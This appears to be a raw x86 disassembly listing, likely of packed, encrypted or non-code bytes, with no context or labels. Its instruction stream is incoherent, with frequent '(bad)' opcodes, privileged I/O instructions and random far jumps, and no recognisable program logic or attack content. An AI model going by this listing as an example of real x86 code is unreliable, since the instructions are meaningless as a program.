  41c264:	sub    esp,DWORD PTR [esi+0x7953c798]
  41c26a:	mov    ds:0xc06e16a7,al
  41c26f:	sub    eax,0x206fd354
  41c274:	loop   0x41c211
  41c276:	push   ebp
  41c277:	xor    edx,ecx
  41c279:	jle    0x41c290
  41c27b:	loopne 0x41c2b6
  41c27d:	int3   
  41c27e:	add    eax,0xb0d5b860
  41c283:	xchg   DWORD PTR [edi+0x5c521bdb],edx
  41c289:	test   eax,0xfa44374
  41c28e:	and    bh,al
  41c290:	fsub   QWORD PTR [ebx]
  41c292:	fcmovbe st,st(2)
  41c294:	adc    DWORD PTR [eax-0xe6c244f],0xffffffc3
  41c29b:	or     edi,0x32009991
  41c2a1:	and    BYTE PTR [edi-0x3a],bl
  41c2a4:	out    0x5e,al
  41c2a6:	mov    ch,0xf0
  41c2a8:	fsubr  QWORD PTR [ebp-0x54]
  41c2ab:	mov    BYTE PTR gs:[esp+edx*8-0xf],0x37
  41c2b1:	adc    al,bh
  41c2b3:	inc    edi
  41c2b4:	sar    edx,0xd8
  41c2b7:	stos   DWORD PTR es:[edi],eax
  41c2b8:	xchg   ebx,eax
  41c2b9:	sbb    cl,BYTE PTR [ebx-0x5e293983]
  41c2bf:	(bad)  
  41c2c1:	or     eax,0x2635299a
  41c2c6:	cmp    al,0x4a
  41c2c8:	jne    0x41c2cc
  41c2ca:	(bad)  
  41c2cb:	adc    ah,BYTE PTR [ecx+0x34a63045]
  41c2d1:	cli    
  41c2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2d3:	fwait
  41c2d4:	sbb    dh,cl
  41c2d6:	out    dx,al
  41c2d7:	mov    ch,0xca
  41c2d9:	leave  
  41c2da:	test   eax,0xb2bf0a6c
  41c2df:	adc    edi,DWORD PTR [esi]
  41c2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2e2:	test   eax,0x5ae1e3ca
  41c2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2e8:	aam    0xc7
  41c2ea:	inc    edx
  41c2eb:	pop    ss
  41c2ec:	jle    0x41c2f8
  41c2ee:	sbb    ebx,ebp
  41c2f0:	push   ecx
  41c2f1:	and    BYTE PTR [esi+0x6b],cl
  41c2f4:	pop    ss
  41c2f5:	add    ecx,DWORD PTR [edi+0x37]
  41c2f8:	xchg   edx,eax
  41c2fa:	pop    es
  41c2fb:	mov    al,0xad
  41c2fd:	add    BYTE PTR [ecx+esi*4-0x65b03a3d],cl
  41c304:	mov    cl,BYTE PTR [eax-0x3]
  41c307:	cs scas al,BYTE PTR es:[edi]
  41c309:	xchg   ebp,eax
  41c30a:	outs   dx,DWORD PTR ds:[esi]
  41c30b:	fwait
  41c30c:	mov    dl,0x6e
  41c30e:	shl    edx,1
  41c310:	jnp    0x41c2b5
  41c312:	lds    edx,FWORD PTR [edi-0x4]
  41c315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c316:	mov    esi,0x79180ad5
  41c31b:	cs pop ss
  41c31d:	das    
  41c31e:	enter  0xccba,0xc1
  41c322:	in     al,dx
  41c323:	dec    edi
  41c324:	js     0x41c337
  41c326:	push   ebx
  41c327:	jnp    0x41c2da
  41c329:	xor    DWORD PTR [ebx+0x76cadd5a],0xa1dcf925
  41c333:	push   ds
  41c334:	mov    bh,0xb4
  41c336:	jle    0x41c32a
  41c338:	es xor al,0x28
  41c33b:	add    BYTE PTR [edi-0x3d61ad0e],0xb0
  41c342:	add    bl,cl
  41c344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c346:	cs push edx
  41c348:	je     0x41c2e8
  41c34a:	dec    eax
  41c34b:	stc    
  41c34c:	cmc    
  41c34d:	repz xlat BYTE PTR ds:[ebx]
  41c34f:	sub    DWORD PTR [ebx-0x6c],esp
  41c352:	and    al,0xbe
  41c354:	inc    edx
  41c355:	repnz and al,0x1
  41c358:	xor    al,0x91
  41c35a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c35b:	dec    eax
  41c35c:	pusha  
  41c35d:	pop    esp
  41c35e:	pop    ebx
  41c35f:	pusha  
  41c360:	mov    bh,0xe4
  41c362:	call   0x6ddc:0xd9246d8e
  41c369:	loopne 0x41c32d
  41c36b:	enter  0xd99f,0x7c
  41c36f:	int    0xaf
  41c371:	mov    cl,0x6
  41c373:	mov    ebx,0x80d74e25
  41c378:	lahf   
  41c379:	(bad)  
  41c37a:	sub    ecx,edi
  41c37c:	pop    ecx
  41c37d:	jmp    0xcd4d:0x3a00472d
  41c384:	xchg   BYTE PTR [ecx+0x1a],cl
  41c387:	dec    esi
  41c388:	(bad)  
  41c389:	clc    
  41c38a:	sar    DWORD PTR [ebp-0x1],1
  41c38d:	(bad)  
  41c38e:	in     eax,dx
  41c38f:	ret    
  41c390:	dec    ecx
  41c391:	(bad)  
  41c392:	leave  
  41c393:	sub    DWORD PTR cs:[edx],eax
  41c396:	xchg   ebp,eax
  41c397:	jg     0x41c39e
  41c399:	pop    esi
  41c39a:	nop
  41c39b:	jae    0x41c340
  41c39d:	nop
  41c39e:	fisub  DWORD PTR [ecx]
  41c3a0:	mov    ch,0x7d
  41c3a2:	jg     0x41c3ae
  41c3a4:	in     eax,dx
  41c3a5:	out    dx,eax
  41c3a6:	or     BYTE PTR ds:0xf16f14c9,bh
  41c3ac:	mov    ch,0x11
  41c3ae:	xchg   BYTE PTR [edx],ch
  41c3b0:	ret    
  41c3b1:	jp     0x41c429
  41c3b3:	pop    es
  41c3b4:	das    
  41c3b5:	outs   dx,DWORD PTR ds:[esi]
  41c3b6:	mov    BYTE PTR es:[edx],bl
  41c3b9:	inc    ecx
  41c3ba:	mov    ds:0x6e8a2161,al
  41c3bf:	inc    ebx
  41c3c0:	aas    
  41c3c1:	add    ebx,DWORD PTR [esi-0x4d]
  41c3c4:	push   ds
  41c3c5:	jg     0x41c3ba
  41c3c7:	sar    dh,cl
  41c3c9:	(bad)  
  41c3ca:	or     DWORD PTR ds:0xb1ced0de,ebx
  41c3d0:	and    dh,dl
  41c3d2:	jo     0x41c44f
  41c3d4:	adc    ebp,edx
  41c3d6:	dec    edx
  41c3d7:	push   ebx
  41c3d8:	pop    edx
  41c3d9:	sbb    ebp,esi
  41c3db:	test   al,0x3c
  41c3dd:	stc    
  41c3de:	cmp    eax,0xa76dd42c
  41c3e3:	and    esi,DWORD PTR [ebx-0x5dfc3e9a]
  41c3e9:	jbe    0x41c45d
  41c3eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3ec:	getsec 
  41c3ee:	and    DWORD PTR [ebx-0x72],eax
  41c3f1:	xchg   esp,eax
  41c3f2:	loopne 0x41c391
  41c3f4:	push   cs
  41c3f5:	pop    es
  41c3f6:	lods   eax,DWORD PTR ds:[esi]
  41c3f7:	sub    esp,DWORD PTR [edi]
  41c3f9:	fisttp QWORD PTR [edx]
  41c3fb:	cmc    
  41c3fc:	aam    0xcc
  41c3fe:	or     dl,BYTE PTR [edx+0x5f]
  41c401:	inc    esi
  41c402:	test   al,0x23
  41c404:	jmp    0x41c3d2
  41c406:	int    0xb4
  41c408:	push   esi
  41c409:	mov    ch,BYTE PTR [ebx]
  41c40b:	or     al,0x6
  41c40d:	mov    ch,0x62
  41c40f:	div    DWORD PTR [edx+0x55]
  41c412:	mov    ch,0xf7
  41c414:	inc    ebx
  41c415:	jle    0x41c410
  41c417:	add    BYTE PTR ds:0x2044813e,bl
  41c41d:	std    
  41c41e:	dec    eax
  41c41f:	cdq    
  41c420:	xor    al,0x82
  41c422:	popa   
  41c423:	inc    esi
  41c424:	add    ch,BYTE PTR [esi]
  41c426:	cwde   
  41c427:	and    BYTE PTR [di-0x4f6],cl
  41c42c:	pop    eax
  41c42d:	sar    DWORD PTR [eax-0x472dc713],cl
  41c433:	test   BYTE PTR [esi+0xc],cl
  41c436:	cmc    
  41c437:	add    BYTE PTR [ecx+0x799131f],al
  41c43d:	sub    eax,0xa5fc16c2
  41c442:	mov    ebp,DWORD PTR [ecx]
  41c444:	push   ebx
  41c445:	test   eax,0xf77e775e
  41c44a:	jno    0x41c42b
  41c44c:	fscale 
  41c44e:	fs iret 
  41c450:	xchg   edx,eax
  41c451:	in     eax,0xeb
  41c453:	push   cs
  41c454:	outs   dx,DWORD PTR ds:[esi]
  41c455:	add    edx,eax
  41c457:	cli    
  41c458:	pop    ds
  41c459:	mov    edi,0xaacc3324
  41c45e:	in     al,dx
  41c45f:	js     0x41c432
  41c461:	mov    ?,WORD PTR ds:0x9fe4f6
  41c467:	pop    eax
  41c468:	int    0x5a
  41c46a:	push   esp
  41c46b:	inc    esi
  41c46c:	aam    0xd6
  41c46e:	sbb    edx,DWORD PTR [ebx+eiz*2]
  41c471:	jmp    0x46673346
  41c476:	pop    edi
  41c477:	in     eax,dx
  41c478:	outs   dx,DWORD PTR ds:[esi]
  41c479:	rcr    DWORD PTR [ebp-0x26],1
  41c47c:	fstp   QWORD PTR [edx-0x33]
  41c47f:	or     eax,0x708fd71a
  41c484:	xor    BYTE PTR [ebx+0x135dd467],cl
  41c48a:	(bad)  
  41c48b:	call   0x526d8f9d
  41c490:	jae    0x41c477
  41c492:	xor    BYTE PTR [ecx+0x5e],dh
  41c495:	fsubr  st,st(3)
  41c497:	dec    edx
  41c498:	(bad)  
  41c499:	(bad)  
  41c49a:	and    al,0x10
  41c49c:	call   0x3:0x95e4b54d
  41c4a3:	xchg   BYTE PTR [edx-0x4bee20e2],cl
  41c4a9:	fistp  QWORD PTR [ebp+0x5a]
  41c4ac:	push   ebp
  41c4ad:	adc    eax,0x74450fb1
  41c4b2:	(bad)  
  41c4b4:	pop    ebx
  41c4b5:	imul   BYTE PTR [ebx-0x7b]
  41c4b8:	or     al,0xa1
  41c4ba:	(bad)
  41c4bd:	daa    
  41c4be:	idiv   bh
  41c4c0:	fstp   DWORD PTR [edi+ebx*2-0x1e6619b2]
  41c4c7:	ret    
  41c4c8:	ss xchg ebx,eax
  41c4ca:	xor    al,0x24
  41c4cc:	sti    
  41c4cd:	sub    esi,DWORD PTR [edi+0x67]
  41c4d0:	ss out dx,eax
  41c4d2:	mov    eax,DWORD PTR [edi+0x4b55cd2d]
  41c4d8:	sbb    eax,0x3353fcdd
  41c4dd:	cmp    al,BYTE PTR [edi-0x15]
  41c4e0:	and    BYTE PTR [ebx+0x18],cl
  41c4e3:	jl     0x41c465
  41c4e5:	(bad)  
  41c4e6:	or     al,0x81
  41c4e8:	in     eax,0xb2
  41c4ea:	or     al,0xa1
  41c4ec:	into   
  41c4ed:	sbb    eax,0x140dba0a
  41c4f2:	mov    ebx,0xc65af812
  41c4f7:	jns    0x41c489
  41c4f9:	std    
  41c4fa:	ins    DWORD PTR es:[edi],dx
  41c4fb:	inc    ebx
  41c4fc:	or     eax,0xf7ec741d
  41c501:	dec    ebp
  41c502:	sub    DWORD PTR [ebx+0x62],ecx
  41c505:	cli    
  41c506:	out    0x88,al
  41c508:	clc    
  41c509:	or     DWORD PTR [edi-0x118ff5a6],edx
  41c50f:	clc    
  41c510:	fiadd  WORD PTR [esp+ecx*4+0x51]
  41c514:	shl    cl,cl
  41c516:	jnp    0x41c4b9
  41c518:	xchg   ebp,eax
  41c519:	pop    eax
  41c51a:	and    eax,0x4c5fcb0
  41c51f:	push   0xffffffe8
  41c521:	push   esi
  41c522:	ret    0x8a9
  41c525:	add    ebx,ebx
  41c527:	cmp    BYTE PTR [ecx+0xc],0x67
  41c52b:	ror    BYTE PTR [ecx-0x6fb98ae],1
  41c531:	mov    edi,0x4c4a858
  41c536:	scas   eax,DWORD PTR es:[edi]
  41c537:	dec    esp
  41c538:	and    BYTE PTR [eax+ecx*2],al
  41c53b:	fwait
  41c53c:	iret   
  41c53d:	xchg   edx,eax
  41c53e:	adc    al,0x6b
  41c540:	cdq    
  41c541:	jmp    0x41c4ee
  41c543:	inc    esi
  41c544:	adc    esp,DWORD PTR [eax+0x3f]
  41c547:	xchg   ebp,eax
  41c548:	mov    cl,0x24
  41c54a:	mov    al,0xb4
  41c54c:	outs   dx,BYTE PTR fs:[esi]
  41c54e:	mov    edx,0x2b96b133
  41c553:	pop    ebp
  41c554:	cmp    DWORD PTR [eax-0x50],esi
  41c557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c558:	int    0x27
  41c55a:	mov    edi,0xdae674ca
  41c55f:	rcr    BYTE PTR [ecx-0x5d7c90a3],1
  41c565:	pop    eax
  41c566:	mov    bl,0xa9
  41c568:	mov    eax,DWORD PTR [esi-0x7d78381d]
  41c56e:	inc    esp
  41c56f:	mul    BYTE PTR [edx+0x6ca30c50]
  41c575:	nop
  41c576:	mov    WORD PTR [ebp-0x72],cs
  41c579:	and    BYTE PTR [edi+eax*8-0x78767873],bl
  41c580:	mov    bl,BYTE PTR [edi+ecx*2]
  41c583:	cmp    BYTE PTR [edx+0x532bbfe6],ch
  41c589:	rcr    BYTE PTR [edx+edi*1-0x62],1
  41c58d:	xchg   edi,eax
  41c58e:	inc    edi
  41c58f:	ret    0x4b7e
  41c592:	cmp    DWORD PTR [ecx-0x3d],ecx
  41c595:	cmp    edx,esi
  41c597:	pop    ds
  41c598:	jmp    0x41c5d5
  41c59a:	jns    0x41c5e7
  41c59c:	sub    al,0xb9
  41c59e:	pop    edi
  41c59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5a1:	call   0xea8a:0x2171228c
  41c5a8:	scas   eax,DWORD PTR es:[edi]
  41c5a9:	fmul   st(2),st
  41c5ab:	xor    edx,DWORD PTR [ecx-0x1029ad21]
  41c5b1:	daa    
  41c5b2:	fidiv  DWORD PTR [ebx+0x4832ad2]
  41c5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5b9:	fwait
  41c5ba:	mov    ah,dl
  41c5bc:	pop    ecx
  41c5bd:	into   
  41c5be:	push   ebx
  41c5bf:	mov    esi,0x96cef102
  41c5c4:	mov    al,0x1f
  41c5c6:	enter  0x87f2,0x3
  41c5ca:	and    ebx,DWORD PTR [ecx+0x51]
  41c5cd:	enter  0x17e3,0x30
  41c5d1:	mov    esi,0x450d4f48
  41c5d6:	xor    eax,0xe6e7b184
  41c5db:	arpl   WORD PTR ds:0xd462f058,di
  41c5e1:	sar    DWORD PTR [esi],1
  41c5e3:	nop
  41c5e4:	inc    ebp
  41c5e5:	ds mov ch,0x79
  41c5e8:	icebp  
  41c5e9:	idiv   BYTE PTR [ecx+0x4074f6eb]
  41c5ef:	outs   dx,DWORD PTR ds:[esi]
  41c5f0:	inc    ebx
  41c5f1:	pop    esp
  41c5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5f3:	sbb    dl,bl
  41c5f5:	inc    ecx
  41c5f6:	rol    DWORD PTR [edx],cl
  41c5f8:	cmp    eax,0x30f3d050
  41c5fd:	(bad)  
  41c5fe:	pmullw mm2,mm3
  41c601:	fnsave [ebx+0x2f3c7e8a]
  41c607:	cs sahf 
  41c609:	icebp  
  41c60a:	les    eax,FWORD PTR [esp+eiz*4-0x37]
  41c60e:	mov    eax,ds:0xa1568976
  41c613:	mov    eax,ds:0x51a75094
  41c618:	pop    eax
  41c619:	mov    esi,0x8299cfbe
  41c61e:	fild   DWORD PTR ds:0x3d7578c3
  41c624:	jne    0x41c5e0
  41c626:	push   eax
  41c627:	loopne 0x41c5fa
  41c629:	push   ss
  41c62a:	hlt    
  41c62b:	add    eax,0x2d69379
  41c630:	mov    dl,0x6b
  41c632:	fimul  WORD PTR [eax+0x7f0e1e79]
  41c638:	ja     0x41c694
  41c63a:	cmc    
  41c63b:	fs std 
  41c63d:	sbb    eax,esp
  41c63f:	inc    edx
  41c640:	ins    BYTE PTR es:[edi],dx
  41c641:	dec    edx
  41c642:	xchg   ecx,eax
  41c643:	xor    bl,BYTE PTR [ebx-0x33]
  41c646:	es xchg esi,eax
  41c648:	call   0xbf73:0x3036d149
  41c64f:	popa   
  41c650:	push   ebp
  41c651:	dec    esp
  41c652:	aad    0x67
  41c654:	mov    eax,0xc6fdf2ff
  41c659:	fild   WORD PTR [ecx]
  41c65b:	je     0x41c6cc
  41c65d:	mov    bl,0xce
  41c65f:	bnd ret 0x42b6
  41c663:	cmp    eax,0xc86901ab
  41c668:	xchg   esi,eax
  41c669:	sbb    DWORD PTR [edx+0x22],ebx
  41c66c:	dec    eax
  41c66d:	mov    ds:0x86aab091,eax
  41c672:	mov    DWORD PTR [edi-0x55],esp
  41c675:	(bad)  
  41c676:	arpl   dx,bx
  41c678:	and    dh,BYTE PTR [eax-0x7f57a8a3]
  41c67e:	pop    ds
  41c67f:	cmp    al,0xf4
  41c681:	sub    BYTE PTR [ebx],dl
  41c683:	sbb    ecx,DWORD PTR [ebp+0x2c19a6c8]
  41c689:	sbb    eax,0xdfc09112
  41c68e:	fadd   DWORD PTR [esi-0x5ebc3b9c]
  41c694:	aas    
  41c695:	dec    edi
  41c696:	add    bh,BYTE PTR [esi-0x4]
  41c699:	stc    
  41c69a:	add    eax,edi
  41c69c:	xor    al,0xe5
  41c69e:	lea    ecx,[edx-0x19e307f1]
  41c6a4:	test   eax,0xe7b88717
  41c6a9:	mov    eax,ds:0xe99d2a76
  41c6ae:	push   ds
  41c6af:	xchg   edx,eax
  41c6b0:	cli    
  41c6b1:	push   ds
  41c6b2:	into   
  41c6b3:	aaa    
  41c6b4:	mov    edi,0xafdff0bf
  41c6b9:	cmp    BYTE PTR [ebp-0x80],0x39
  41c6bd:	cmp    eax,0xbe8c4fb0
  41c6c2:	push   ecx
  41c6c3:	sub    BYTE PTR [ebx+0x4cc94893],0x4b
  41c6ca:	mov    DWORD PTR [esp+ecx*8+0x1],edi
  41c6ce:	ss push es
  41c6d0:	in     al,0x7f
  41c6d2:	retf   0x8a23
  41c6d5:	fidivr WORD PTR [ebx-0x3d0c47b3]
  41c6db:	and    ah,BYTE PTR [ebp+ebp*1+0x61]
  41c6df:	mov    BYTE PTR [ebx+0x478c97b3],0x7f
  41c6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6e7:	push   edx
  41c6e8:	push   ecx
  41c6e9:	mov    ch,0xfd
  41c6eb:	(bad)  
  41c6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6ed:	ror    BYTE PTR [esi+0x5e],cl
  41c6f0:	pop    es
  41c6f1:	fcom   st(2)
  41c6f3:	loope  0x41c758
  41c6f5:	lods   al,BYTE PTR ds:[esi]
  41c6f6:	sub    edx,DWORD PTR [edx+ecx*2-0x27]
  41c6fa:	sbb    dl,BYTE PTR [edi+edi*4-0x382918c3]
  41c701:	loopne 0x41c729
  41c703:	jo     0x41c770
  41c705:	lods   eax,DWORD PTR ds:[esi]
  41c706:	dec    ebp
  41c707:	inc    edi
  41c708:	adc    al,0xa7
  41c70a:	pop    ebx
  41c70b:	inc    edi
  41c70c:	adc    DWORD PTR [ecx],eax
  41c70e:	xchg   esi,eax
  41c70f:	push   ebp
  41c710:	out    dx,eax
  41c711:	daa    
  41c712:	sub    dl,cl
  41c714:	push   edi
  41c715:	and    al,0x47
  41c717:	imul   esi,DWORD PTR [ebx],0xeecaf768
  41c71d:	cwde   
  41c71e:	(bad)  
  41c71f:	mov    bl,0x43
  41c721:	push   ecx
  41c722:	clc    
  41c723:	fldcw  WORD PTR [eax-0x3b6aee12]
  41c729:	ds enter 0xb872,0x88
  41c72e:	push   ds
  41c72f:	jcxz   0x41c6df
  41c732:	push   ecx
  41c733:	aad    0x31
  41c735:	mov    ebx,0xf00ef37b
  41c73a:	sub    dl,BYTE PTR [edx+0x886547f]
  41c740:	sbb    edi,DWORD PTR [eax]
  41c742:	mov    dl,BYTE PTR [esi+0x1634f64]
  41c748:	cdq    
  41c749:	push   ebp
  41c74a:	sbb    ch,BYTE PTR [edi-0x28]
  41c74d:	jmp    0xf198:0xb9b51f3a
  41c754:	push   esp
  41c755:	push   ebx
  41c756:	out    0x66,al
  41c758:	push   esp
  41c759:	ja     0x41c751
  41c75b:	mov    bl,0x50
  41c75d:	pop    edi
  41c75e:	imul   ebx,DWORD PTR [esi-0x6b],0x974c5e99
  41c765:	add    esi,DWORD PTR [edx-0x551b2094]
  41c76b:	pop    es
  41c76c:	mov    dl,BYTE PTR ds:[ebx]
  41c76f:	xor    BYTE PTR [esi+0x730ba1b],bh
  41c775:	jg     0x41c713
  41c777:	jecxz  0x41c7b3
  41c779:	mov    cl,0x4d
  41c77b:	or     eax,0xe45dff81
  41c780:	scas   eax,DWORD PTR es:[edi]
  41c781:	mov    ch,0x20
  41c783:	mov    dh,0x47
  41c785:	jge    0x41c7c2
  41c787:	iret   
  41c788:	cs adc al,0x2e
  41c78b:	xchg   edi,eax
  41c78c:	mov    ds:0xe7fcdada,eax
  41c791:	ja     0x41c767
  41c793:	xor    ah,al
  41c795:	imul   edi,DWORD PTR [eax-0x5a],0xa3cf7f43
  41c79c:	jo     0x41c7f5
  41c79e:	test   BYTE PTR [edx-0x59f6c356],ch
  41c7a4:	fdivr  QWORD PTR [ebx+edi*4]
  41c7a7:	xchg   edx,eax
  41c7a8:	push   cs
  41c7a9:	mov    ebx,0x7aff6341
  41c7ae:	jg     0x41c7e5
  41c7b0:	push   0x76
  41c7b2:	hlt    
  41c7b3:	arpl   WORD PTR [esi+0x61b6a30b],ax
  41c7b9:	mov    esi,0xc992bcf5
  41c7be:	sub    eax,0x24d8d578
  41c7c3:	cmp    al,BYTE PTR [ecx-0x28]
  41c7c6:	leave  
  41c7c7:	inc    ecx
  41c7c8:	loop   0x41c813
  41c7ca:	mov    esp,0x4000f99c
  41c7cf:	inc    esi
  41c7d0:	jns    0x41c768
  41c7d2:	jbe    0x41c7b9
  41c7d4:	test   al,0x4c
  41c7d6:	sub    al,0xf5
  41c7d8:	test   al,dl
  41c7da:	clc    
  41c7db:	dec    ebx
  41c7dc:	out    0x76,al
  41c7de:	jnp    0x41c7a5
  41c7e0:	pop    ebp
  41c7e1:	or     ah,0x45
  41c7e4:	or     DWORD PTR ds:0x61a9e85,ebx
  41c7ea:	pop    es
  41c7eb:	(bad)  
  41c7ec:	iret   
  41c7ed:	add    esi,DWORD PTR [ebx]
  41c7ef:	cdq    
  41c7f0:	sub    DWORD PTR [eax],ecx
  41c7f2:	mov    ah,0x63
  41c7f4:	inc    esi
  41c7f5:	pushf  
  41c7f6:	sbb    DWORD PTR [edi],eax
  41c7f8:	sbb    al,0x9c
  41c7fa:	out    0x21,eax
  41c7fc:	cwde   
  41c7fd:	ja     0x41c796
  41c7ff:	leave  
  41c800:	out    dx,eax
  41c801:	sbb    ebp,DWORD PTR [ebx-0x3e086f8d]
  41c807:	inc    edi
  41c808:	mov    bl,0x75
  41c80a:	sar    bh,1
  41c80c:	test   ah,0xd1
  41c80f:	scas   eax,DWORD PTR es:[edi]
  41c810:	xor    DWORD PTR [ebp+eiz*8-0x78],0x98e9acd4
  41c818:	popa   
  41c819:	sbb    al,0x2d
  41c81b:	add    esi,DWORD PTR [esi-0x9]
  41c81e:	fs (bad) 
  41c820:	jno    0x41c7ba
  41c822:	fcom   DWORD PTR gs:[esi]
  41c825:	and    eax,0x1a9d4158
  41c82a:	es push eax
  41c82c:	ins    BYTE PTR es:[edi],dx
  41c82d:	cdq    
  41c82e:	mov    al,0xa3
  41c830:	stos   BYTE PTR es:[edi],al
  41c831:	iret   
  41c832:	inc    edx
  41c833:	add    edx,DWORD PTR [edi]
  41c835:	xchg   ebp,eax
  41c836:	(bad)  
  41c837:	sub    cl,BYTE PTR [ebp-0x77b54a29]
  41c83d:	mov    DWORD PTR [edx-0x68],ebx
  41c840:	es sub eax,0xcf021e16
  41c846:	cli    
  41c847:	loope  0x41c7cb
  41c849:	es enter 0x8abe,0x52
  41c84e:	sub    ch,BYTE PTR [eax+0x6]
  41c851:	clc    
  41c852:	scas   al,BYTE PTR es:[edi]
  41c853:	jne    0x41c8b5
  41c855:	push   es
  41c856:	hlt    
  41c857:	jmp    0x41c8b6
  41c859:	lahf   
  41c85a:	pop    ecx
  41c85b:	dec    esi
  41c85c:	pop    ecx
  41c85d:	mov    ds:0x54137c6d,al
  41c862:	js     0x41c7e6
  41c864:	shl    DWORD PTR [esi],cl
  41c866:	repnz xchg ebx,eax
  41c868:	dec    esp
  41c869:	pop    ebx
  41c86a:	xor    bh,bh
  41c86c:	imul   edi,DWORD PTR [edx+ebp*4+0x9],0x89321819
  41c874:	ret    
  41c875:	inc    esi
  41c876:	pop    esp
  41c877:	sub    eax,0xbe79e616
  41c87c:	sbb    BYTE PTR [edx+0x78],bh
  41c87f:	rcl    BYTE PTR [ebx+eax*4-0x7172b47f],1
  41c886:	in     eax,0x99
  41c888:	cld    
  41c889:	out    dx,eax
  41c88a:	lahf   
  41c88b:	pop    esp
  41c88c:	push   esp
  41c88d:	sub    dl,dl
  41c88f:	or     DWORD PTR [ecx+ebp*8],esp
  41c892:	pop    ds
  41c893:	adc    eax,0x9d51d474
  41c898:	pushf  
  41c899:	cmp    al,0x8b
  41c89b:	ficom  WORD PTR [ebx-0x1a]
  41c89e:	daa    
  41c89f:	add    esi,edx
  41c8a1:	or     al,0xda
  41c8a3:	and    al,0x6d
  41c8a5:	(bad)  
  41c8a6:	mov    WORD PTR [ebp-0x6e083b1d],ds
  41c8ac:	and    bl,BYTE PTR [ecx]
  41c8ae:	mov    ch,0x4f
  41c8b0:	push   ss
  41c8b1:	fsubr  DWORD PTR [ecx-0x67]
  41c8b4:	jne    0x41c868
  41c8b6:	cmp    DWORD PTR [eax+0x2f01d65],0xa7658118
  41c8c0:	les    esi,FWORD PTR [ecx+0x72]
  41c8c3:	icebp  
  41c8c4:	adc    ecx,DWORD PTR [eax-0x54]
  41c8c7:	mov    ebp,0x5cea0296
  41c8cc:	mov    WORD PTR [bp+si-0x65c7],ss
  41c8d1:	jp     0x41c854
  41c8d3:	push   0x4e95602c
  41c8d8:	sbb    esp,DWORD PTR [esi-0x46]
  41c8db:	add    BYTE PTR [ebp-0x64],ch
  41c8de:	scas   eax,DWORD PTR es:[edi]
  41c8df:	stos   BYTE PTR es:[edi],al
  41c8e0:	xchg   esp,eax
  41c8e1:	mov    eax,ds:0xd949df34
  41c8e6:	or     ah,BYTE PTR [edi-0x4893f0c4]
  41c8ec:	xchg   esi,eax
  41c8ed:	ror    BYTE PTR [ebp+0x5e],cl
  41c8f0:	jl     0x41c901
  41c8f2:	jmp    0xe114:0xe1318855
  41c8f9:	mov    eax,ds:0xa491c292
  41c8fe:	cli    
  41c8ff:	push   edi
  41c900:	mov    ecx,0xbc675d61
  41c905:	mov    ch,0x6d
  41c907:	dec    BYTE PTR [edi+0x64]
  41c90a:	inc    edi
  41c90b:	jbe    0x41c975
  41c90d:	test   eax,0x39879068
  41c912:	inc    ebx
  41c913:	mov    ecx,0xe6c208d9
  41c918:	xchg   DWORD PTR [edi+0x33949139],esi
  41c91e:	int    0xd4
  41c920:	jl     0x41c925
  41c922:	pop    ds
  41c923:	pusha  
  41c924:	dec    ebp
  41c925:	or     al,0x72
  41c927:	sbb    eax,DWORD PTR [ebx+0x1742c268]
  41c92d:	push   edi
  41c92e:	sar    BYTE PTR [esp+eax*1-0x5c474917],cl
  41c935:	pop    ecx
  41c936:	icebp  
  41c937:	cmp    al,0x45
  41c939:	ret    0xad2a
  41c93c:	sbb    ch,BYTE PTR [esi-0x77738b2a]
  41c942:	sahf   
  41c943:	loopne 0x41c97b
  41c945:	aas    
  41c946:	call   0xa6b333e0
  41c94b:	add    DWORD PTR [esi-0x39],ebp
  41c94e:	std    
  41c94f:	xchg   DWORD PTR [edx+0x15],ebx
  41c952:	cdq    
  41c953:	cmp    DWORD PTR [esi],edx
  41c955:	mov    ah,0xf7
  41c957:	mov    ds:0x9a1d2d80,al
  41c95c:	lods   eax,DWORD PTR ds:[esi]
  41c95d:	mov    fs,WORD PTR [edx+0x7a0b22b6]
  41c963:	int3   
  41c964:	mov    dh,0x52
  41c966:	ins    BYTE PTR es:[edi],dx
  41c967:	leave  
  41c968:	outs   dx,DWORD PTR ds:[esi]
  41c969:	and    BYTE PTR gs:0x5a81b9ba,dl
  41c970:	iret   
  41c971:	cmc    
  41c972:	and    BYTE PTR [ebp+0x114f52],dh
  41c978:	imul   edx
  41c97a:	pop    ds
  41c97b:	inc    eax
  41c97c:	cmp    ebp,esp
  41c97e:	xlat   BYTE PTR ds:[ebx]
  41c97f:	sub    bl,BYTE PTR [esi-0x7389fbdb]
  41c985:	push   ebp
  41c986:	shr    BYTE PTR [ebx],0x18
  41c989:	cmp    al,BYTE PTR ds:0x95296823
  41c98f:	adc    BYTE PTR [edi+0x59],0xfd
  41c993:	xchg   ebx,eax
  41c994:	mov    WORD PTR [ecx],?
  41c996:	aas    
  41c997:	scas   eax,DWORD PTR es:[edi]
  41c998:	xchg   BYTE PTR [edi-0x41e2d3ec],dl
  41c99e:	inc    esi
  41c99f:	push   esp
  41c9a0:	mov    ecx,0x9870a676
  41c9a5:	mov    cl,0x5a
  41c9a7:	sahf   
  41c9a8:	fild   QWORD PTR [edx-0x6b]
  41c9ab:	hlt    
  41c9ac:	ror    DWORD PTR [edx],cl
  41c9ae:	mov    ecx,DWORD PTR [ecx]
  41c9b0:	jne    0x41c97c
  41c9b2:	rcr    bh,0xc0
  41c9b5:	out    dx,eax
  41c9b6:	mov    al,ds:0xecf8772c
  41c9bb:	pop    ss
  41c9bc:	pop    es
  41c9bd:	les    ebp,FWORD PTR [esi+0x74]
  41c9c0:	cmp    al,0xa9
